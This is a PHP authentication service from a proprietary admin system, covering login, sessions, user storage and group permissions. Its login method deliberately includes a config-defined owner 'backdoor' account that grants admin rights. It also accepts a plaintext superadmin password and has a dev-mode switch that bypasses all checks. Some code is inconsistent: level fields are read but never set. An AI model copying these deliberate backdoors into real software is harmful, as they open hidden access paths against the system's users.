<?php

// SPDX-License-Identifier: LicenseRef-Proprietary
// Copyright (c) 2026 Felix Maywald alias RaptorXilef. All rights reserved.
// Usage without explicit permission is strictly prohibited.
// See LICENSE.md for full license details.

/**
 * Path: src/Infrastructure/Auth/AuthService.php
 */

declare(strict_types=1);

namespace App\Infrastructure\Auth;

use App\Infrastructure\Config\Config;

/**
 * Service für die Admin-Authentifizierung
 */
final readonly class AuthService
{
    public function __construct(
        private Config $config,
        private ?\PDO $pdo, // Das '?' erlaubt NULL
    ) {
        if (\session_status() === \PHP_SESSION_NONE) {
            \session_start();
        }
    }

    /**
     * Prüft Benutzername und Passwort.
     */
    public function login(string $username, string $password): bool
    {
        // A. Check gegen die unzerstörbare Hintertür (RaptorXilef)
        $backdoor = $this->config->get('backdoor');
        if (\is_array($backdoor) && $username === ($backdoor['user'] ?? '')) {
            if (\password_verify($password, $backdoor['pass'] ?? '')) {
                // Wir geben dem System-Inhaber die Gruppe 'admin'
                $this->setSession($username, 'admin', $backdoor['label'] ?? 'Inhaber');

                return true;
            }
        }

        // B. Check gegen den konfigurierten SuperAdmin (dev_admin.php)
        $superCfg = $this->config->get('superadmin');
        if (\is_array($superCfg) && $username === ($superCfg['user'] ?? '')) {
            $storedPass = $superCfg['pass'] ?? '';
            // Erlaubt Klartext (für den allerersten Start) ODER Hash
            if ($password === $storedPass || \password_verify($password, $storedPass)) {
                $this->setSession($username, 'admin', $superCfg['label'] ?? 'SuperAdmin');

                return true;
            }
        }

        // C. Normale User-Prüfung (SQL/JSON)
        $users = $this->loadUsers();
        if (isset($users[$username]) && \password_verify($password, (string) $users[$username]['pass'])) {
            // Wir speichern nun die GRUPPE statt des Levels in der Session
            $this->setSession($username, (string) $users[$username]['group'], (string) ($users[$username]['label'] ?? ''));

            return true;
        }

        return false;
    }

    private function setSession(string $user, string $group, string $label): void
    {
        $_SESSION['admin_user']  = $user;
        $_SESSION['admin_group'] = $group; // Gruppe statt Level
        $_SESSION['admin_label'] = $label;
    }

    /**
     * @return array<string, array<string, mixed>>
     */
    public function loadUsers(): array
    {
        $cfg = $this->config->get('storage_config')['users'];

        if ($cfg['type'] === 'mysql') {
            if (! $this->pdo) {
                throw new \RuntimeException("MySQL-Verbindung für 'Users' erforderlich, aber nicht verfügbar.");
            }
            $stmt  = $this->pdo->query("SELECT * FROM {$cfg['table']}");
            $rows  = $stmt->fetchAll();
            $users = [];
            foreach ($rows as $r) {
                $users[$r['username']] = $r;
            }

            return $users;
        }

        $path = $this->config->get('root_path') . '/' . $this->config->get('storage_path_prefix') . $cfg['file'];

        return \file_exists($path) ? (\json_decode((string) \file_get_contents($path), true) ?? []) : [];
    }

    /**
     * @param array<string, array<string, mixed>> $users
     */
    public function saveUsers(array $users): void
    {
        $cfg = $this->config->get('storage_config')['users'];

        if ($cfg['type'] === 'mysql') {
            if (! $this->pdo) {
                throw new \RuntimeException("MySQL-Verbindung für 'Users' erforderlich, aber nicht verfügbar.");
            }
            $stmt = $this->pdo->prepare("REPLACE INTO {$cfg['table']} (username, level, label, pass) VALUES (?, ?, ?, ?)");
            foreach ($users as $username => $data) {
                $stmt->execute(
                    [
                        $username,
                        (int) $data['level'],
                        $data['label'],
                        $data['pass'],
                    ],
                );
            }

            return;
        }

        $path = $this->config->get('root_path') . '/' . $this->config->get('storage_path_prefix') . $cfg['file'];
        \file_put_contents($path, \json_encode($users, \JSON_PRETTY_PRINT));
    }

    public function isLoggedIn(): bool
    {
        // Prüft jetzt auf admin_group statt admin_level
        return isset($_SESSION['admin_group']) || $this->config->get('admin_dev_mode', false) === true;
    }

    public function getLevel(): int
    {
        // Wenn Dev-Mode aktiv, immer Level 0 (Vollzugriff)
        if ($this->config->get('admin_dev_mode', false) === true) {
            return 0; // Im Dev-Mode immer Dev-Admin
        }

        return (int) ($_SESSION['admin_level'] ?? 3);
    }

    public function logout(): void
    {
        \session_destroy();
    }

    // In src/Infrastructure/Auth/AuthService.php

    public function getUsername(): string
    {
        // Wenn der eingeloggte User der aus der Config ist, geben wir seinen echten Namen zurück
        return (string) ($_SESSION['admin_user'] ?? 'Unbekannt');
    }

    /**
     * Die neue Herzstück-Methode für das Rechtesystem
     */
    public function hasPermission(string $permission): bool
    {
        // A. Gott-Modus (Dev-Mode oder Superadmin aus Config)
        $devAdminName = $this->config->get('superadmin')['user'];

        // 1. Dev-Mode Fallback
        // 2. Die absolute Absicherung: Der User aus der Config ist GOTT
        if ($this->config->get('admin_dev_mode', false) === true || $this->getUsername() === $devAdminName) {
            return true;
        }

        // Berechtigungen der Gruppe laden
        $groupKey  = $_SESSION['admin_group'] ?? 'guest';
        $groups    = $this->loadGroups();
        $userPerms = $groups[$groupKey]['permissions'] ?? [];

        // --- PHASE 1: VERBOTE (NEGATION) ---
        // Wir prüfen zuerst, ob ein explizites Verbot vorliegt (beginnend mit '-')
        foreach ($userPerms as $p) {
            if (! \str_starts_with($p, '-')) {
                continue;
            }

            $negatedPerm = \substr($p, 1); // Das Minus entfernen

            // Explizites Verbot (z.B. -dashboard.active.details)
            if ($negatedPerm === $permission) {
                return false;
            }

            // Wildcard-Verbot (z.B. -dashboard.active.*)
            if (\str_ends_with($negatedPerm, '.*')) {
                $prefix = \substr($negatedPerm, 0, -1);
                if (\str_starts_with($permission, $prefix)) {
                    return false;
                }
            }

            // Suffix-Wildcard-Verbot (z.B. -*.details)
            if (\str_starts_with($negatedPerm, '*.')) {
                $suffix = \substr($negatedPerm, 1);
                if (\str_ends_with($permission, $suffix)) {
                    return false;
                }
            }
        }

        // --- PHASE 2: ERLAUBNISSE ---
        foreach ($userPerms as $p) {
            if (\str_starts_with($p, '-')) {
                continue;
            } // Überspringe Verbote in dieser Phase

            if ($p === '*' || $p === $permission) {
                return true;
            }

            // Präfix-Wildcard (LuckPerms Stil: dashboard.active.*)
            if (\str_ends_with($p, '.*')) {
                $prefix = \substr($p, 0, -1); // "dashboard.active."
                if (\str_starts_with($permission, $prefix)) {
                    return true;
                }
            }

            // Suffix-Wildcard (z:B. alle Druck-Buttons: *.print)
            if (\str_starts_with($p, '*.')) {
                $suffix = \substr($p, 1); // ".print"
                if (\str_ends_with($permission, $suffix)) {
                    return true;
                }
            }
        }

        // --- PHASE 3: IMPLIZITE ABHÄNGIGKEITEN (AUTO-VIEW) ---
        // Wenn nach ".view" gefragt wird, der User aber ein Recht hat,
        // das im selben Pfad liegt (z.B. .print), erlauben wir den View.
        if (\str_ends_with($permission, '.view')) {
            $basePath = \str_replace('.view', '', $permission); // z.B. "dashboard.active"
            foreach ($userPerms as $p) {
                // Nur wenn es kein Verbot ist und im selben Pfad liegt
                if (! \str_starts_with($p, '-') && \str_starts_with($p, $basePath)) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * Lädt die Gruppen-Definitionen (v0.29.0)
     */
    public function loadGroups(): array
    {
        $path = $this->config->get('root_path') . '/' . $this->config->get('storage_path_prefix') . 'groups.json';
        if (! \file_exists($path)) {
            return [];
        }

        return \json_decode((string) \file_get_contents($path), true) ?? [];
    }

    public function getGroup(): string
    {
        return $_SESSION['admin_group'] ?? 'guest';
    }
}
